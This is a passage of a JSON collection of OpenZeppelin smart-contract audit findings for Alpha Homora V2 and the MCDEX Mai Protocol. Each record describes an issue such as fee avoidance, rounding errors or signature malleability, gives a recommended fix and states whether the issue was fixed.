      "content": "Throughout the spell contracts – namely [`UniswapV2SpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol), [`SushiswapSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/SushiswapSpellV1.sol), [`BalancerSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol), and [`CurveSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/CurveSpellV1.sol) – assumptions are made about a position’s collateral token, and the spell’s intended collateral token. We now consider the example of the [`addLiquidityWStakingRewards` function](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol#L185) of the `UniswapV2SpellV1`, however the same issue exists in different forms within all spells listed above.\n\n\nThe function fetches the [position’s underlying collateral information](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol#L199), requires that the [collateral token wraps the desired liquidity provider (LP) token](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol#L201), and then assumes from then onwards that the collateral token [*is* the `wstaking` token](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol#L202). Given that `werc20`-wrapped LP tokens are a form of collateral within the protocol, the [global `werc20` token](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BasicSpell.sol#L15) would also pass the require statement despite not being the `wstaking` token.\n\n\nWhile assuming that the collateral token is `wstaking` does not cause any vulnerabilities, it does lead to the call reverting. Unwrapping the actual collateral token instead would enable users to unwrap LP tokens from `werc20` or a different `wstaking` contract, and deposit again with rewards using the current `wstaking` contract.\n\n\nIf the intention with the require statement is to ensure that the existing collateral token *is* `wstaking`, then consider adding a more explicit `require` statement to check for this. Otherwise, consider unwrapping the position’s actual collateral token to enable for greater functionality within the spell.\n\n\n***Update:** Fixed in [PR#97](https://github.com/AlphaFinanceLab/homora-v2/pull/97).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10874",
      "title": "[M02] Governor can prevent user repaying debt",
      "impact": "MEDIUM",
      "content": "When borrowing from the bank, the protocol [requires that the token being borrowed is whitelisted](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L457), to ensure that only approved tokens can be used within the protocol. However, when repaying the bank, [the same is required](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L478). This means that if governance concludes that a previously-whitelisted token is no longer safe, and they want to prevent users from borrowing that token, then they would have no option but to cause users with outstanding debt in that token to be unable to repay that debt.\n\n\nThe same issue is also true of spells that inherit from [`WhitelistSpell`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/WhitelistSpell.sol#L6) and require that a liquidity provider (LP) token is whitelisted both when depositing and withdrawing it. This is the case in [`UniswapV2SpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/UniswapV2SpellV1.sol), [`SushiswapSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/SushiswapSpellV1.sol), [`CurveSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/CurveSpellV1.sol), and [`BalancerSpellV1`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/spell/BalancerSpellV1.sol).\n\n\nConsider removing the requirement that [repayments require a whitelisted token](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L478) to enable users to repay debt on previously-whitelisted tokens, or to withdraw previously deposited LP tokens. Alternatively, if more granular control over all operations is preferred, then consider modifying the whitelist implementation to support permissions for the different processes in the system.\n\n\n***Update:** Partially fixed in [PR#96](https://github.com/AlphaFinanceLab/homora-v2/pull/96). Alpha implemented a mechanism in the HomoraBank that allows them to pause borrows and repayments separately. However this fix is not on a per-token basis, and so if the team wants to remove just 1 token from the system, they will still be forced to either lock up all user funds in that token, or to pause borrows for all tokens. Additionally no fixes were made for the whitelisting in spells.*",
      "summary": "\nThis bug report is about the Homora Protocol, which requires tokens to be whitelisted in order to be borrowed or repaid from the bank. The same issue is true of spells that inherit from `WhitelistSpell` and require that a liquidity provider (LP) token is whitelisted both when depositing and withdrawing it. This means that if governance concludes that a previously-whitelisted token is no longer safe, and they want to prevent users from borrowing that token, then they would have no option but to cause users with outstanding debt in that token to be unable to repay that debt.\n\nThe bug report suggests removing the requirement that repayments require a whitelisted token to enable users to repay debt on previously-whitelisted tokens, or to withdraw previously deposited LP tokens. Alternatively, if more granular control over all operations is preferred, then consider modifying the whitelist implementation to support permissions for the different processes in the system.\n\nA partial fix has been implemented in PR#96. Alpha implemented a mechanism in the HomoraBank that allows them to pause borrows and repayments separately. However, this fix is not on a per-token basis, and so if the team wants to remove just 1 token from the system, they will still be forced to either lock up all user funds in that token, or to pause borrows for all tokens. Additionally, no fixes were made for the whitelisting in spells.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10873",
      "title": "[M01] Math not rounding in protocol favor",
      "impact": "MEDIUM",
      "content": "Throughout [`HomoraBank`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol), the amount of debt owed by a position is calculated proportionally to the number of debt shares that position holds. The exact calculation performed is `debtOwed = totalDebt * positionsShare / totalShare`. However, this calculation truncates the debt owed in the user’s favor – rounding down even when `x.99999` is owed.\n\n\nThis means that at any given time, a significant amount of debt can be unaccounted for. Say `n` users each owe `100.9` to the protocol, the sum of their `debtOwed` calculated with truncation is `0.9n` less than the `totalDebt` of the protocol. In an extreme situation, this could lead the protocol to become `0.9n` undercollateralized without detection. If users start paying off this truncated debt, then the extra amount of debt is passed on to other users.\n\n\nIn some situations, a truncation in the user’s favor can have catastrophic consequences for a protocol. While we have not found that to be true of this situation, consider always rounding all divisions in the protocol’s favor to help mitigate the risk of users abusing their advantage in the system.\n\n\n***Update:** Fixed in [PR#95](https://github.com/AlphaFinanceLab/homora-v2/pull/95).*",
      "summary": "\nA bug was recently found in the code of HomoraBank, a protocol used to calculate the amount of debt owed by a position. The calculation used to determine the debt owed was truncating the debt owed in the user’s favor - rounding down even when x.99999 was owed. This could lead to a situation where the protocol becomes undercollateralized without detection, as users are not paying off the full amount of debt. As a result, the extra debt is passed on to other users. To prevent this from happening, it is recommended to always round divisions in the protocol’s favor to help mitigate the risk of users abusing their advantage in the system. This bug has now been fixed in PR#95.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10872",
      "title": "[H01] Users can force other users to pay their fees",
      "impact": "HIGH",
      "content": "When users [`borrow` tokens](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L456) using `HomoraBank`, the bank performs a [borrow from `CREAM`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L570). As `HomoraBank` takes on the debt from `CREAM`, it must account internally for each user’s proportionate share of that debt. As `CREAM` adds interest to the borrowed amount, the [`totalDebt` for the corresponding token increases](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L190), which in turn increases the amount owed by each `HomoraBank` user who has debt in that token.\n\n\nIn addition to paying interest, users also pay a fee to the governor of `HomoraBank`. This [fee is a percentage](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L189) of the interest earned by `CREAM`. However, while the `CREAM` interest is [accrued automatically](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L112) on many calls to the bank – so that the interest earned is always up to date at the time of a withdrawal – the same is not true of the fee.\n\n\nThe fee is calculated every time interest is accrued, in the [`accrue` function](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L183). The fee amount is then merely recorded as a `pendingReserve` in the bank struct; it is not yet added to the `totalDebt` owed by users (which is required to effectively “charge” the fee). Only when the governor calls the function [`resolveReserve`](https://github.com/AlphaFinanceLab/homora-v2/blob/5efa332f2ecf8e9705c326cffda5305bc6f752f7/contracts/HomoraBank.sol#L211), does the `pendingReserve` “resolve” and the fee actually get added to the `totalDebt`.\n\n\nThis means that if a user repays their debt before the governor next calls `resolveReserve`, they will avoid paying fees on their debt. The economic incentive is then for users to front-run the governor’s calls to `resolveReserve`. Importantly, although a user could avoid paying fees in this manner, the fees would still be accrued to the bank, and they would instead be charged to the other users who have debt associated with the same token.\n\n\nIn extreme cases, especially if `resolveReserve` were not called regularly by governance, malicious users could pass off huge amounts of fees to other users, which could lead to those other users getting liquidated as a result.\n\n\nTo avoid these issues and to align the code with the intent of the system, consider incrementing `totalDebt` every time fees are accrued to ensure that all fees are charged to users fairly according to their share of borrows.\n\n\n***Update:** Fixed in [PR#94](https://github.com/AlphaFinanceLab/homora-v2/pull/94).*",
      "summary": "\nThe bug report is related to the HomoraBank system, which is a platform for users to borrow tokens. When users borrow tokens using HomoraBank, the bank takes on debt from CREAM and must account for each user’s share of that debt. As CREAM adds interest to the borrowed amount, the totalDebt for the corresponding token increases, resulting in an increase in the amount owed by each HomoraBank user with debt in that token.\n\nIn addition to paying interest, users also pay a fee to the governor of HomoraBank. This fee is a percentage of the interest earned by CREAM and is calculated every time interest is accrued. The fee amount is then recorded as a pendingReserve in the bank structure. However, the fee is not added to the totalDebt owed by users, and it is only when the governor calls the resolveReserve function that the pendingReserve “resolves” and the fee is actually added to the totalDebt.\n\nThis means that if a user repays their debt before the governor next calls resolveReserve, they will avoid paying fees on their debt. This could result in malicious users passing off huge amounts of fees to other users, leading to those other users getting liquidated as a result. To avoid these issues, the code should be updated to increment totalDebt every time fees are accrued to ensure that all fees are charged to users fairly according to their share of borrows. This bug was fixed in PR#94.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Alpha Finance Homora V2 Audit",
      "source_link": "https://blog.openzeppelin.com/alpha-homora-v2/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11423",
      "title": "[L12] Unclear variable names",
      "impact": "LOW",
      "content": "The variable name `guy` is used frequently throughout the code. To favor explicitness and readability, we suggest renaming all instances of the variable `guy` to `trader` in [`Collateral.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol), [`Position.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Position.sol), in [`Perpetual.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol), [`Exchange.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol), [`ContractReader.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/reader/ContractReader.sol), [`PerpetualProxy.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/proxy/PerpetualProxy.sol) and [`AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol), as well as any corresponding occurrences within interface contracts.\n\n\nAdditionally, in the `LibMath` library [the `_UINT256_MAX` variable](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L230) is declared as `uint256` with value `2**255 -1`. This is not actually the maximum value for `uint256` variables, which is `2**256-1`. This assignment makes sense since the constant is the maximum value that can be represented by an `int256`. Nevertheless, in order to avoid confusion for future developers, consider renaming the variable or adding a comment explaining why this is not the actual maximum representable value.\n\n\n**Update:** *Fixed. The variable `guy` has been renamed to `trader` throughout the code base and `_UINT256_MAX` has been renamed to `_POSITIVE_INT256_MAX`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11422",
      "title": "[L11] ShareToken contract details",
      "impact": "LOW",
      "content": "The [`decimals`, `name` and `symbol` variables](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/token/ShareToken.sol#L8-L10) of the `ShareToken` contract are explicitly defined. While OpenZeppelin Contracts are already used, consider using the [`ERC20Detailed`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v2.5.0/contracts/token/ERC20/ERC20Detailed.sol) contract, which contains the additional variables.\n\n\nThis would change `decimals` to a `uint8` instead of a `uint256`, making it consistent with [the standard](https://eips.ethereum.org/EIPS/eip-20).\n\n\nNote that in the [newest package version](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L44-L46) these details of an `ERC20` contract have been included in the main contract.\n\n\n**Update:** *Fixed. `ShareToken` now inherits `ERC20Detailed`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11421",
      "title": "[L10] Implicit input value assumption",
      "impact": "LOW",
      "content": "In the `LibMath` library the [`wpowi` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L106) is assuming implicitly that `n` is non-negative. It actually returns the wrong answer if a negative `n` is used.\n\n\nIn order to avoid wrong returned values, consider validating the input within `wpowi` before executing the calculations.\n\n\n**Update:** *Fixed. The `wpowi` function now specifically accepts only non-negative values of `n`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11420",
      "title": "[L09] Hard-coded order version",
      "impact": "LOW",
      "content": "In the [`Exchange` contract](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol), the constant [SUPPORTED\\_ORDER\\_VERSION](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L18) is set to the value `2`, but is not used in the code base. However, the function `validateOrderParam` [ensures](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L162) that the order’s version is `2`.\n\n\nSince it appears that these two parts of the code are related, consider using `SUPPORTED_ORDER_VERSION` in the [guard condition](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/exchange/Exchange.sol#L162). This will ensure that changing this value will impart the expected behavior, and will improve code readability and auditability.\n\n\n**Update:** *Fixed. The order version’s hardcoded value of `2` has been replaced by the `SUPPORTED_ORDER_VERSION` constant in the code.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11419",
      "title": "[L08] Use of arithmetic operators instead of LibMath functions",
      "impact": "LOW",
      "content": "Given below is the list of occurrences in the codebase where arithmetic calculations are performed using arithmetic operators instead of using `LibMath` library functions:\n\n\n* [In `ChainlinkAdapter.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/oracle/ChainlinkAdapter.sol#L17) : For calculating the `newPrice`, multiplication is done using the `*` operator rather than using the `LibMathSigned.mul` function\n* [In `InversedChainlinkAdapter.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/oracle/InversedChainlinkAdapter.sol#L18) : For calculating the `newPrice`, multiplication is done using the `*` operator rather than using the `LibMathSigned.mul` function\n* [In `Collateral.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L33) : implements subtraction of `decimals` from `MAX_DECIMALS` using the `-` operator instead of `LibMathUnsigned.sub` function\n* [In `AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L554) : multiplication between two integers are performed using `*` operator\n\n\nTo safeguard from code overflows, underflows and arithmetic errors, please consider using [`LibMath`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol) libraries. Also note that the `LibMath` libraries are using `*` and `/` operators instead of relying on their own safe methods. Examples can be found [here](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L223) and [here](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L282)\n\n\n**Update:** *Fixed. Suggested changes have been made.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11418",
      "title": "[L07] Transfer of ETH may unexpectedly fail",
      "impact": "LOW",
      "content": "In the [`_withdraw`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L84) and [`withdrawFromProtocol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Collateral.sol#L114) functions of the `Collateral` contract, the transfer of Ether is executed with Solidity’s `transfer` function, which forwards a limited amount of gas to the receiver. Should the receiver be a contract with a fallback function that needs more than 2300 units of gas to execute, the transfer of Ether would inevitably fail. After the Istanbul hard fork, it has become a [recommended practice not to use `transfer`](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) to avoid hard dependencies on specific gas costs.\n\n\nTo avoid unexpected failures in the withdrawal of Ether, consider replacing `transfer` with the [`sendValue` function](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/utils/Address.sol#L51) available in the OpenZeppelin Contracts library.\n\n\n**Update:** *Fixed. The `transfer` function has been replaced with the `sendValue` function.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11417",
      "title": "[L06] Incorrect guard condition",
      "impact": "LOW",
      "content": "The [guard condition that limits withdrawals from the insurance fund](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L207) compares the raw token value to the scaled WAD balance. Therefore, it doesn’t actually protect against withdrawing too much. In practice, the subsequent [sanity check](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L213) will catch any errors. Nevertheless, for clarity, consider updating the guard condition to compare values of the same scale.\n\n\n**Update:** *Fixed. The proper check has been implemented.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11416",
      "title": "[L05] Commented out code",
      "impact": "LOW",
      "content": "The functions [`isEmergency`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/interface/IPerpetualProxy.sol#L46) and [`isGlobalSettled`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/interface/IPerpetualProxy.sol#L48) in the `IPerpetualProxy` contract are commented out without giving developers enough context on why those lines have been discarded, thus providing them with little to no value at all.\n\n\nSimilarly, the functions [`roundFloor`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L135-L141) and [`roundCeil`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibMath.sol#L143-L149) in the `LibMathSigned` library are commented out.\n\n\nTo improve the readability of the code, consider removing the commented lines from the codebase.\n\n\n**Update:** *Fixed. Commented code has been removed from `LibMathSigned`. `IPerpetualProxy` contract has been removed altogether.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11415",
      "title": "[L04] Erroneous docstrings and comments",
      "impact": "LOW",
      "content": "Several docstrings and inline comments throughout the code base were found to be erroneous and should be fixed. In particular:\n\n\n* The NatSpec comment on [line 20 of `LibSignature.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibSignature.sol#L20) states that `hash` is the result of an EIP-712 hash, when it can actually be this or a normal [Ethereum hash on a bytes structure](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibSignature.sol#L35).\n* On [line 111 of `AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L111), the comment should say `last* functions are calculated based on on-chain fundingState`.\n* The comment on [line 555 of `AMM.sol`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L555) appears to be a copy of the comment on [line 551](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/liquidity/AMM.sol#L551), and should be deleted.\n\n\n**Update:** *Partially fixed. The NatSpec comment in `LibSignature.sol` and the repeated comment in `AMM.sol` have been fixed. However the docstring above the `current*` functions in the `AMM.sol` still mentions that [`current* functions are calculated based on the on-chain fundingState`](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/liquidity/AMM.sol#L163) instead of `last* functions are calculated based on the on-chain fundingState`*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11414",
      "title": "[L03] Overwriting cash balance",
      "impact": "LOW",
      "content": "The [`setCashBalance` function](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L44) can be used to manually adjust a trader’s cash balance during the `SETTLING` phase. However, if a separate balance-changing transaction (such as [`deposit`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L93) or [`liquidate`](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/perpetual/Perpetual.sol#L291)) is confirmed first, the adjustment will not account for the new balance. Consider replacing the `setCashBalance` function with `increaseCashBalance` and `decreaseCashBalance` functions to avoid the possible race condition.\n\n\n**Update:** *Fixed. The `setCashBalance` function has been replaced by [`increaseCashBalance`](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/perpetual/Perpetual.sol#L109-L112) and [`decreaseCashBalance`](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/perpetual/Perpetual.sol#L121-L124) functions.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/mcdex-mai-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11413",
      "title": "[L02] Fragile signature verification",
      "impact": "LOW",
      "content": "ECDSA signatures are [inherently malleable](https://bitcoin.stackexchange.com/questions/83408/in-ecdsa-why-is-r-%E2%88%92s-mod-n-complementary-to-r-s), where it is possible to modify a valid signature to produce an equivalent signature over the same data. In Ethereum, this has been [addressed for transactions](https://eips.ethereum.org/EIPS/eip-2), but not for `ecrecover`. Since `LibSignature` [uses `ecrecover` directly](https://github.com/mcdexio/mai-protocol-v2/blob/4b198083ec4ae2d6851e101fc44ea333eaa3cd92/contracts/lib/LibSignature.sol#L41) over arbitrary inputs, it will accept these modified signatures as valid.\n\n\nAdditionally, [`ecrecover` returns zero](https://solidity.readthedocs.io/en/v0.6.8/units-and-global-variables.html#mathematical-and-cryptographic-functions) when the signature fails, but this condition is not validated in `LibSignature`. Therefore, it is possible to produce a valid order on behalf of the zero address.\n\n\nAlthough neither of these edge cases can be exploited directly in the current system, it introduces unnecessary fragility. Consider importing and using the `recover` function from [OpenZeppelin’s ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/cryptography/ECDSA.sol) not only to benefit from bug fixes to be applied in future releases, but also to reduce the code’s attack surface.\n\n\n**Update:** *Fixed. A [`recover` function](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/lib/LibSignature.sol#L52-L66) is added in the `LibSignature` library to remove the reported fragilities by adding checks on `s` and `v`. This function also checks whether the returned value from `ecrecover` is zero. Please note that these checks are based on the OpenZeppelin’s ECDSA library `recover` function that is [imported in the code](https://github.com/mcdexio/mai-protocol-v2/blob/2fcbf4b44f4595e5879ff5efea4e42c529ef0ce1/contracts/lib/LibSignature.sol#L4) but never used.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "MCDEX Mai Protocol Audit",
